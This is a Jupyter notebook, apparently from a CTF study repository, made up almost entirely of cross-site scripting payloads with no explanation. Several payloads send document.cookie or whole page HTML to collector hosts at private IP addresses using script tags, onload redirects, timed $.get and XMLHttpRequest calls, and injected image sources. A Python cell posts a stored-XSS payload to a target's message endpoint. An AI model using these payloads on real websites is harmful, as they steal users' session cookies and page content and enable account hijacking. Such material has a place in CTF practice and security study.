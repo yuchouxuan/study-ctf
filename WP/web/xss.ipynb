{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```javascript\n",
    "<script src=\"http://10.100.0.218\" > </script>\n",
    "<BODY ONLOAD=document.location='http://10.100.0.218/?cookie='+document.cookie;></BODY>\n",
    "<img src=\"http://10.100.0.218/?cookie=\"+    >x</img>\n",
    "<iframe   title=\"ZhiKang\" src='http://10.100.0.218:1999/?cookie='+document.cookie;></iframe>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 定时get\n",
    "- 1\n",
    "```javascript\n",
    "<script>\n",
    "function clock88()\n",
    "{\n",
    "var a = document.getElementsByTagName('body')[0].innerHTML;\n",
    "$.get({url:\"http://10.100.0.218/?f=\"+encodeURI(a)});\n",
    "}\n",
    "setInterval(\"clock88()\",1000 );\n",
    "</script><!--\n",
    "```\n",
    "- 2\n",
    "```javascript\n",
    "<script>\n",
    "function work(){\n",
    "    var xhr = new XMLHttpRequest();\n",
    "    xhr.open('POST', 'http://ip:5555', true);\n",
    "    xhr.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n",
    "    xhr.send(document.getElementsByTagName('html')[0].innerHTML);\n",
    "}\n",
    "window.setTimeout(work, 1000);\n",
    "<script><!-- \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 动态dom\n",
    "```javascript\n",
    "var a = document.getElementsByClassName('messageBox');\n",
    "for(i = 0;i<a.length; i++)\n",
    "{\n",
    "var con = document.getElementsByClassName('messageBox')[0]\n",
    "var img = document.createElement(\"img\");\n",
    "img.setAttribute(\"id\", \"newImg\");\n",
    "img.src=\"http://192.168.10.27/?f=\"+a[i].textContent;\n",
    "con.appendChild(img);\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "ename": "",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31mFailed to start the Kernel. \n",
      "PermissionError: [WinError 32] 另一个程序正在使用此文件，进程无法访问。: 'C:\\\\Users\\\\yucho\\\\.ipython\\\\profile_default\\\\history.sqlite' -> 'C:\\\\Users\\\\yucho\\\\.ipython\\\\profile_default\\\\history-corrupt-2022-08-03T16.50.53.853272.sqlite'. \n",
      "View Jupyter <a href='command:jupyter.viewOutput'>log</a> for further details."
     ]
    }
   ],
   "source": [
    "url='http://10.101.0.5:8080/addMessage'\n",
    "import requests\n",
    "pl = '''\n",
    "<BODY ONLOAD=document.location='http://10.100.0.218/?cookie='+navigator.appName;></BODY><!--\n",
    "'''\n",
    "requests.post(url,data={'message':pl})\n",
    "print(1)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
